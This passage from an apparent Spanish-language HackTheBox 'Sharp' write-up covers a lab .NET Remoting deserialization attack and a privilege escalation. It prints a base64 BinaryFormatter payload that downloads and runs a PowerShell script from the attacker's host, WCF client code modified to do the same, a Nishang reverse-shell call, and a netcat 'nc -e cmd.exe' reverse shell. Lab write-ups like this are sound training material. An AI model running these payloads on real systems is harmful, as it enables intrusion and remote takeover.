mU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=
```

Y ahora **ExploitRemotingService**:

```powershell
PS C:\htb_sharp\files> .\ExploitRemotingService\ExploitRemotingService\bin\Debug\ExploitRemotingService.exe tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint -s --user="debug" --pass="SharpApplicationDebugUserPassword123!" raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAF4vYyBwb3dlcnNoZWxsIC1jIElFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuMzQ6ODAwMC9QLnBzMScpBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=
```

En consola obtenemos:

```powershell
System.InvalidCastException: Unable to cast object of type 'System.Collections.Generic.SortedSet`1[System.String]' to type 'System.Runtime.Remoting.Messaging.IMessage'.
   at System.Runtime.Remoting.Channels.CoreChannel.DeserializeBinaryRequestMessage(String objectUri, Stream inputStream, Boolean bStrictBinding, TypeFilterLevel securityLevel)
   at System.Runtime.Remoting.Channels.BinaryServerFormatterSink.ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage& responseMsg, ITransportHeaders& responseHeaders, Stream& responseStream)
```

Pero que pasa, como toda deserialización, el proceso falla, pero no nos interesa, porque nuestro código se ejecutó antes que el error, por lo tanto nosotros ya hemos conseguido una sesión:

![303win_cmd_exploitremotingserviceEXE_revsh](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_exploitremotingserviceEXE_revsh.png)

Tamos en el sistema como `lars` y tenemos acceso a la flag `user.txt` :) 

Enumeremos para ver como escalar privilegios...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Recorriendo la máquina encontramos unos archivos en `c:\Users\lars\Documents`:

```powershell
c:\Users\lars\Documents>dir
 Volume in drive C is System
 Volume Serial Number is 7824-B3D4

 Directory of c:\Users\lars\Documents

02/08/2021  07:35 PM    <DIR>          .
02/08/2021  07:35 PM    <DIR>          ..
11/15/2020  01:40 PM    <DIR>          wcf
               0 File(s)              0 bytes
               3 Dir(s)  32,343,658,496 bytes free

c:\Users\lars\Documents>dir wcf
dir wcf
 Volume in drive C is System
 Volume Serial Number is 7824-B3D4

 Directory of c:\Users\lars\Documents\wcf

11/15/2020  01:40 PM    <DIR>          .
11/15/2020  01:40 PM    <DIR>          ..
11/15/2020  01:40 PM    <DIR>          .vs
11/15/2020  01:40 PM    <DIR>          Client
11/15/2020  01:40 PM    <DIR>          packages
11/15/2020  01:40 PM    <DIR>          RemotingLibrary
11/15/2020  01:41 PM    <DIR>          Server
11/15/2020  12:47 PM             2,095 wcf.sln
               1 File(s)          2,095 bytes
               7 Dir(s)  32,343,658,496 bytes free

c:\Users\lars\Documents>
```

Si le damos un vistaso al cliente (como hicimos al inicio) vemos:

```powershell
c:\Users\lars\Documents>cd wcf\Client
c:\Users\lars\Documents\wcf\Client>dir
 Volume in drive C is System
 Volume Serial Number is 7824-B3D4

 Directory of c:\Users\lars\Documents\wcf\Client

11/15/2020  01:40 PM    <DIR>          .
11/15/2020  01:40 PM    <DIR>          ..
11/14/2020  11:14 PM               184 App.config
11/15/2020  01:40 PM    <DIR>          bin
11/15/2020  01:36 PM             2,639 Client.csproj
11/15/2020  01:40 PM    <DIR>          obj
11/15/2020  01:39 PM               625 Program.cs
11/15/2020  01:40 PM    <DIR>          Properties
               3 File(s)          3,448 bytes
               5 Dir(s)  32,343,658,496 bytes free
```

```powershell
c:\Users\lars\Documents\wcf\Client>type Program.cs
```

```cs
using RemotingSample;
using System;
using System.ServiceModel;

namespace Client {

    public class Client
    {
        public static void Main() {
            ChannelFactory<IWcfService> channelFactory = new ChannelFactory<IWcfService>(
                new NetTcpBinding(SecurityMode.Transport),"net.tcp://localhost:8889/wcf/NewSecretWcfEndpoint"
            );
            IWcfService client = channelFactory.CreateChannel();
            Console.WriteLine(client.GetDiskInfo());
            Console.WriteLine(client.GetCpuInfo());
            Console.WriteLine(client.GetRamInfo());
        }
    }
}
c:\Users\lars\Documents\wcf\Client>
```

Tiene practicamente la misma estructura que el anterior cliente, pero lo interesante de esto es su propietario:

```powershell
c:\Users\lars\Documents\wcf\Client>dir /q *
 Volume in drive C is System
 Volume Serial Number is 7824-B3D4

 Directory of c:\Users\lars\Documents\wcf\Client

11/15/2020  01:40 PM    <DIR>          BUILTIN\Administrators .
11/15/2020  01:40 PM    <DIR>          BUILTIN\Administrators ..
11/14/2020  11:14 PM               184 BUILTIN\Administrators App.config
11/15/2020  01:40 PM    <DIR>          BUILTIN\Administrators bin
11/15/2020  01:36 PM             2,639 BUILTIN\Administrators Client.csproj
11/15/2020  01:40 PM    <DIR>          BUILTIN\Administrators obj
11/15/2020  01:39 PM               625 BUILTIN\Administrators Program.cs
11/15/2020  01:40 PM    <DIR>          BUILTIN\Administrators Properties
               3 File(s)          3,448 bytes
               5 Dir(s)  32,343,658,496 bytes free

c:\Users\lars\Documents\wcf\Client>
```

Lo que quiere decir que lo que se esté ejecutando, será <<ejecutado>> con privilegios de administrador. Intentemos modificar el archivo `Client.exe`, pero para eso debemos mover todo el directorio (por tema de librerías, llamados, etc.) a nuestra máquina para agregar lo que necesitemos y posteriormente compilar y volver a subir los objetos.

Podemos generar un comprimido de todo para facilitarnos la transferencia, aprovechamos el uso de `PowerShell` y la herramienta [Compress-Archive](https://superuser.com/questions/201371/create-zip-folder-from-the-command-line-windows) para hacerlo:

```powershell
PS C:\Users\lars\Documents> Compress-Archive wcf c:\dev\out.zip
PS C:\Users\lars\Documents> dir c:\dev

    Directory: C:\dev

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/15/2020  10:25 AM           5632 Client.exe
-a----       11/15/2020   1:59 PM             70 notes.txt
-a----         2/8/2021  11:36 PM       11598452 out.zip
-a----       11/15/2020  10:25 AM           4096 RemotingLibrary.dll
-a----       11/16/2020  11:55 AM           6144 Server.exe
```

Pero... ¿Por qué sobre la ruta `dev/`? Bueno, si recordamos, los archivos `Client.exe`, `Server.exe` y `notes.txt` los obtuvimos mediante `SMB` con el usuario `lars` sobre la carpeta compartida `dev/`. Lo que quiere decir que seguimos teniendo acceso a ella, solo que ahora lo haremos desde Windows.

Abrimos la conexión sobre la unidad `Z:` ahora:

![303win_cmd_netuseDEVshare](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_netuseDEVshare.png)

Validamos:

```powershell
PS C:\htb_sharp\files> net use
No se recordarán las nuevas conexiones.

Estado       Local     Remoto                    Red

-------------------------------------------------------------------------------
Conectado    Z:        \\10.10.10.219\dev        Microsoft Windows Network
Se ha completado el comando correctamente.
```

* [Info sobre el uso de **net use**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)).

Perfecto, ahora simplemente validamos que tengamos los archivos:

```powershell
PS C:\htb_sharp\files> dir z:

    Directorio: z:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----    15/11/2020  05:25 a. m.           5632 Client.exe
-a----    15/11/2020  08:59 a. m.             70 notes.txt
-a----    08/02/2021  06:36 p. m.       11598452 out.zip
-a----    15/11/2020  05:25 a. m.           4096 RemotingLibrary.dll
-a----    16/11/2020  06:55 a. m.           6144 Server.exe
```

Tenemos el comprimido, ahora si a jugar :)

Descomprimimos y abrimos el archivo `wcf.sln` con `Visual Studio`:

![303win_vs_wcfSLN](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_vs_wcfSLN.png)

Detallamos que al ser ejecutado, muestra info del sistema; información del disco, de la CPU y la RAM :I

```powershell
Console.WriteLine(client.GetDiskInfo());
Console.WriteLine(client.GetCpuInfo());
Console.WriteLine(client.GetRamInfo());
```

Probemos ahora a agregar una linea que nos genere una nueva Reverse Shell, pero ahora será como `Administrator` (ojala :P).

```c
//Podemos simplemente invocar PowerShell usando el cliente que ya esta definido
Console.WriteLine(client.InvokePowerShell("IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34:8000/P.ps1')"));
```

Ahora el codigo quedaria:

![303win_vs_wcfSLN_clientMOD](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_vs_wcfSLN_clientMOD.png)

Compilamos :O

```powershell
1>------ Operación Compilar iniciada: proyecto: RemotingLibrary, configuración: Debug Any CPU ------
1>  RemotingLibrary -> C:\htb_sharp\files\wcfCompress\wcf\RemotingLibrary\bin\Debug\WcfRemotingLibrary.dll
2>------ Operación Compilar iniciada: proyecto: Client, configuración: Debug Any CPU ------
2>  Client -> C:\htb_sharp\files\wcfCompress\wcf\Client\bin\Debug\WcfClient.exe
========== Compilar: 2 correctos, 0 incorrectos, 0 actualizados, 0 omitidos ==========
```

Perfe, antes de pasar los archivos (más que todo por que me acorde y despues de me olvida :P), modifiquemos el objeto `P.ps1` para que apunte a otro puerto por ejemplo el `4435`.

```powershell
...
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.34 -Port 4435
```

Pongamonos en escucha:

```powershell
PS C:\htb_sharp\files> .\nc.exe -lvp 4435
listening on [any] 4435 ...
```

Movamoslos:

```powershell
PS C:\Users\lars\Videos> IWR -uri http://10.10.14.34:8000/WcfClient.exe -OutFile c:\Users\lars\Videos\WcfClient.exe
PS C:\Users\lars\Videos> IWR -uri http://10.10.14.34:8000/WcfRemotingLibrary.dll -OutFile c:\Users\lars\Videos\WcfRemotingLibrary.dll
PS C:\Users\lars\Videos> ls

    Directory: C:\Users\lars\Videos

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/9/2021   1:11 AM           5120 WcfClient.exe
-a----         2/9/2021   1:11 AM           7680 WcfRemotingLibrary.dll
```

Y ejecutamos el binario:

```powershell
PS C:\Users\lars\Videos> .\WcfClient.exe
...
```

Salen errores, peeeeeeeeeeerooooooooooooooooooooooooooooooooooooooooo:

![303win_cmd_wcfclient_revshDONE](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_cmd_wcfclient_revshDONE.png)

Nicceeeeeeeeeeeeeeeeeeeeeeeeeeeeee, tamos dentro paaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaai!!

Veamos las flags.

Bueno, aún no, la sesión se cierra rápido, intentemos subir el binario `nc` para rápidamente generar otra Reverse Shell separada del proceso que tiene el `WcfClient.exe`:

```powershell
PS C:\Users\lars\Videos> IWR -uri http://10.10.14.34:8000/nc64.exe -OutFile c:\Users\lars\Videos\nc.exe
```

Ejecutamos de nuevo el binario `.\WcfClient.exe` y apenas tengamos la Shell por el puerto `4435`, generamos otra por el `4436` (nos ponemos en escucha):

```powershell
PS C:\Windows\system32> c:\Users\lars\Videos\nc.exe 10.10.14.34 4436 -e cmd.exe
```

Ahora si veamos las flags:

![303win_flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_flags.png)

Antes de irnos, cerremos la unidad `Z:` que habíamos abierto para compartirnos el archivo comprimido:

```powershell
PS C:\htb_sharp\files> net use
No se recordarán las nuevas conexiones.

Estado       Local     Remoto                    Red

-------------------------------------------------------------------------------
Conectado    Z:        \\10.10.10.219\dev        Microsoft Windows Network
Se ha completado el comando correctamente.
```

```powershell
PS C:\htb_sharp\files> net use Z: /delete
Hay archivos abiertos y/o búsquedas incompletas de directorios pendientes en la conexión con Z:.

¿Desea continuar la desconexión y forzar el cierre? (S/N) [N]: S
Z: se ha eliminado.

PS C:\htb_sharp\files> net use
No se recordarán las nuevas conexiones.

No hay entradas en la lista.

PS C:\htb_sharp\files>
```

Ahora seeee.

...

Hemo acabao' como siempre, muchas gracias por leer y nos veremos en otro writeup ;) A ROMPER TODOOOOOOOOOOOO!